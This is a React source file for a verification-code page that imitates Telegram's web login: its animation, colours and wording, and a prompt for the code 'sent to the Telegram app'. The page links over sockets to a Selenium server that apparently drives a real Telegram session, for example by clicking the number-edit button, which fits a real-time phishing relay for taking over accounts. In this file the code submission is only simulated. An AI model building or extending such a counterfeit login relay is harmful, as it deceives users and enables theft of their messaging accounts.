import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import { io, Socket } from 'socket.io-client';

import { Page } from '@/components/Page.tsx';

export const VerificationCodePage: React.FC = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const sessionId = searchParams.get('sessionId');
  const phoneNumber = searchParams.get('phoneNumber');
  
  const [verificationCode, setVerificationCode] = useState('');
  const [status, setStatus] = useState('');
  
  const videoRef = useRef<HTMLVideoElement>(null);
  const socketRef = useRef<Socket | null>(null);

  useEffect(() => {
    // Auto-play the monkey video
    if (videoRef.current) {
      videoRef.current.play().catch(e => {
        console.log('🐵 Video autoplay failed:', e);
      });
    }
  }, []);

  // Socket connection
  useEffect(() => {
    if (sessionId) {
      console.log('🔌 Connecting to Selenium server for verification code page...');
      console.log('🔌 Session ID:', sessionId);
      console.log('🔌 Connecting to: http://localhost:3000');
      
      // Try different connection configurations
      let socket;
      try {
        socket = io('http://localhost:3000', {
          transports: ['polling', 'websocket'],
          timeout: 20000,
          forceNew: true,
          autoConnect: true,
          reconnection: true,
          reconnectionAttempts: 5,
          reconnectionDelay: 1000
        });
      } catch (error) {
        console.error('❌ Failed to create socket:', error);
        // Fallback to basic configuration
        socket = io('http://localhost:3000');
      }
      
      console.log('🔌 Socket created:', socket);
      socketRef.current = socket;

      socket.on('connect', () => {
        console.log('✅ Connected to Selenium server from verification code page');
        console.log('✅ Socket ID:', socket.id);
        console.log('✅ Socket connected:', socket.connected);
      });

      socket.on('connect_error', (error) => {
        console.error('❌ Socket connection error:', error);
        console.error('❌ Error details:', {
          message: error.message,
          name: error.name,
          stack: error.stack
        });
        console.log('💡 Make sure the Selenium server is running on http://localhost:3000');
      });

      socket.on('disconnect', (reason) => {
        console.log('❌ Disconnected from Selenium server:', reason);
        console.log('❌ Socket connected after disconnect:', socket.connected);
      });

      // Retry connection if it fails
      socket.on('reconnect', (attemptNumber) => {
        console.log('🔄 Reconnected to Selenium server after', attemptNumber, 'attempts');
      });

      socket.on('reconnect_error', (error) => {
        console.error('❌ Reconnection error:', error);
      });

      // Add a timeout to check connection status
      setTimeout(() => {
        console.log('🔍 Socket status after 3 seconds:', {
          connected: socket.connected,
          id: socket.id
        });
        
        // If still not connected, try manual connection
        if (!socket.connected) {
          console.log('🔄 Attempting manual connection...');
          socket.connect();
        }
      }, 3000);

      // Expose socket for manual testing in console
      (window as any).debugSocket = socket;
      console.log('🔧 Socket exposed as window.debugSocket for manual testing');

      return () => {
        if (socketRef.current) {
          socketRef.current.disconnect();
          socketRef.current = null;
        }
      };
    }
  }, [sessionId]);

  // Format phone number with proper spacing like Telegram
  const formatPhoneNumber = (phone: string) => {
    // Remove any existing spaces and non-digit characters except +
    const clean = phone.replace(/[^\d+]/g, '');
    
    // If it starts with +, format with spaces
    if (clean.startsWith('+')) {
      const countryCode = clean.substring(0, 4); // +358
      const remaining = clean.substring(4);
      
      // Handle different phone number lengths gracefully
      if (remaining.length >= 9) {
        const areaCode = remaining.substring(0, 3);      // 403
        const firstGroup = remaining.substring(3, 6);    // 624
        const secondGroup = remaining.substring(6, 9);   // 026
        const extra = remaining.substring(9);            // any remaining digits
        
        let formatted = `${countryCode} ${areaCode} ${firstGroup} ${secondGroup}`;
        if (extra) {
          formatted += ` ${extra}`;
        }
        return formatted;
      } else if (remaining.length >= 6) {
        const areaCode = remaining.substring(0, 3);      // 403
        const firstGroup = remaining.substring(3, 6);    // 624
        const extra = remaining.substring(6);            // any remaining digits
        
        let formatted = `${countryCode} ${areaCode} ${firstGroup}`;
        if (extra) {
          formatted += ` ${extra}`;
        }
        return formatted;
      } else if (remaining.length >= 3) {
        const areaCode = remaining.substring(0, 3);      // 403
        const extra = remaining.substring(3);            // any remaining digits
        
        let formatted = `${countryCode} ${areaCode}`;
        if (extra) {
          formatted += ` ${extra}`;
        }
        return formatted;
      } else {
        return `${countryCode} ${remaining}`;
      }
    }
    
    return clean;
  };

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    // Only allow digits
    if (/^\d*$/.test(value)) {
      setVerificationCode(value);
      
      // Auto-submit when 5 digits are entered
      if (value.length === 5) {
        handleSubmit();
      }
    }
  };

  const handleSubmit = async () => {
    if (!verificationCode || verificationCode.length !== 5) {
      return; // Only submit when exactly 5 digits
    }

    setStatus('Verifying code...');

    try {
      // Simulate verification process
      setStatus('Code submitted successfully!');
      
      // Navigate to success page after a moment
      setTimeout(() => {
        navigate(`/success?sessionId=${sessionId}`);
      }, 2000);
      
    } catch (error) {
      console.error('Error submitting verification code:', error);
      setStatus('❌ Error submitting code');
    }
  };


  return (
    <Page back={false}>
      <div style={{
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        minHeight: '100vh',
        padding: '40px 20px',
        backgroundColor: 'white',
        fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
      }}>
        {/* Content Container */}
        <div style={{
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          maxWidth: '400px',
          width: '100%'
        }}>
          
          {/* Animated Monkey */}
          <div style={{
            marginBottom: '32px',
            textAlign: 'center'
          }}>
            <video
              ref={videoRef}
              src="/monkey.mp4"
              style={{
                width: '120px',
                height: '120px',
                objectFit: 'cover'
              }}
              loop
              muted
              playsInline
              autoPlay
            />
          </div>

          {/* Phone Number Display */}
          <div style={{
            marginBottom: '24px',
            textAlign: 'center'
          }}>
            <div style={{
              fontSize: '32px',
              fontWeight: '400',
              color: '#000',
              marginBottom: '8px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '8px',
              fontFamily: 'system-ui'
            }}>
              {phoneNumber ? formatPhoneNumber(phoneNumber) : ''}
              <span
                onClick={() => {
                  console.log('[pencil] ✏️ Pencil icon clicked, clicking .auth-number-edit button in Selenium...');

                  console.log('[pencil] socketRef.current', socketRef.current);
                  console.log('[pencil] sessionId', sessionId);
                  
                  // Check socket connection status
                  if (socketRef.current) {
                    console.log('[pencil] Socket connected:', socketRef.current.connected);
                    console.log('[pencil] Socket ID:', socketRef.current.id);
                  }
                  
                  // Click the edit button in Selenium
                  if (socketRef.current && socketRef.current.connected && sessionId) {
                    socketRef.current.emit('clickNumberEditButton', {
                      sessionId: sessionId,
                      timestamp: new Date().toISOString()
                    });
                    console.log('[pencil] ✅ Edit button click sent to Selenium');
                  } else {
                    console.log('[pencil] ⚠️ Socket not ready, attempting to reconnect...');
                    
                    // Try to reconnect if socket exists but not connected
                    if (socketRef.current && !socketRef.current.connected) {
                      console.log('[pencil] trying to reconnect');
                      socketRef.current.connect();
                      
                      // Wait a bit and try again
                      setTimeout(() => {
                        console.log('[pencil] waited a bit, socketRef.current', socketRef.current);
                        console.log('[pencil] waited a bit, sessionId', sessionId);
                        if (socketRef.current && socketRef.current.connected && sessionId) {
                          socketRef.current.emit('clickNumberEditButton', {
                            sessionId: sessionId,
                            timestamp: new Date().toISOString()
                          });
                          console.log('[pencil] ✅ Edit button click sent to Selenium after reconnect');
                        } else {
                          console.log('[pencil] ⚠️ Still not connected, navigating directly');
                        }
                      }, 1000);
                    } else {
                      console.log('[pencil] ⚠️ No socket available, navigating directly');
                    }
                  }
                  
                  // Wait for clickNumberEditButtonResult event before navigating
                  socketRef.current?.once('clickNumberEditButtonResult', (data) => {
                    if (data.sessionId === sessionId && data.success) {
                      console.log('[pencil] ✅ Number edit button clicked, navigating to phone login');
                      console.log('[pencil] 📞 Current phone number from URL:', phoneNumber);
                      // Pass the phone number back to preserve user input
                      const phoneParam = phoneNumber ? `&phoneNumber=${encodeURIComponent(phoneNumber)}` : '';
                      const navigationUrl = `/phone-login?sessionId=${sessionId}${phoneParam}`;
                      console.log('[pencil] 🔗 Navigation URL:', navigationUrl);
                      navigate(navigationUrl);
                    } else if (data.sessionId === sessionId && !data.success) {
                      console.log('[pencil] ❌ Number edit button click failed:', data.error);
                    }
                  });
                }}
                style={{
                  fontSize: '16px',
                  color: '#999', // Light grey to match screenshot
                  cursor: 'pointer',
                  display: 'inline-flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  width: '24px',
                  height: '24px'
                }}
                title="Edit phone number"
              >
                {/* Pencil icon using PNG */}
                <img
                  src="/pencil.png"
                  alt="Edit"
                  style={{
                    width: '20px',
                    height: '20px',
                    opacity: 0.75,
                    transition: 'opacity 0.2s ease'
                  }}
                  onMouseEnter={(e) => e.currentTarget.style.opacity = '1'}
                  onMouseLeave={(e) => e.currentTarget.style.opacity = '0.75'}
                />
              </span>
            </div>
            <div style={{
              fontSize: '14px',
              color: '#666',
              lineHeight: '1.4'
            }}>
              We've sent the code to the Telegram app on your other device.
            </div>
          </div>

          {/* Verification Code Input */}
          <div style={{
            width: '100%',
            marginBottom: '32px'
          }}>
            <div style={{ marginBottom: '24px' }}>
              <input
                type="text"
                value={verificationCode}
                onChange={handleCodeChange}
                placeholder="Code"
                maxLength={5}
                style={{
                  width: 'calc(100% - (16px + 2px)*2)',
                  height: '48px',
                  padding: '0 16px',
                  fontSize: '16px',
                  border: '2px solid #0088cc',
                  borderRadius: '12px',
                  backgroundColor: '#ffffff',
                  color: '#000',
                  outline: 'none',
                  transition: 'border-color 0.2s ease, box-shadow 0.2s ease'
                }}
                onFocus={(e) => {
                  e.target.style.borderColor = '#0088cc';
                  e.target.style.boxShadow = '0 0 0 3px rgba(0, 136, 204, 0.15)';
                }}
                onBlur={(e) => {
                  e.target.style.borderColor = '#0088cc';
                  e.target.style.boxShadow = 'none';
                }}
              />
            </div>
          </div>


          {/* Status Message */}
          {status && (
            <div style={{
              marginTop: '16px',
              padding: '12px 16px',
              backgroundColor: status.includes('❌') ? '#f8d7da' : '#d4edda',
              color: status.includes('❌') ? '#721c24' : '#155724',
              borderRadius: '8px',
              fontSize: '14px',
              textAlign: 'center',
              width: '100%'
            }}>
              {status}
            </div>
          )}

          {/* Debug Info - Only show when SHOW_DEBUG_INFO is true */}
          {import.meta.env.VITE_SHOW_DEBUG_INFO === 'true' && sessionId && (
            <div style={{
              marginTop: '24px',
              padding: '12px 16px',
              backgroundColor: '#f8f9fa',
              border: '1px solid #dee2e6',
              borderRadius: '8px',
              fontSize: '12px',
              color: '#6c757d',
              width: '100%'
            }}>
              <div>Session: {sessionId}</div>
              <div>Phone: {phoneNumber}</div>
              <div>Code: {verificationCode}</div>
            </div>
          )}
        </div>
      </div>
    </Page>
  );
};
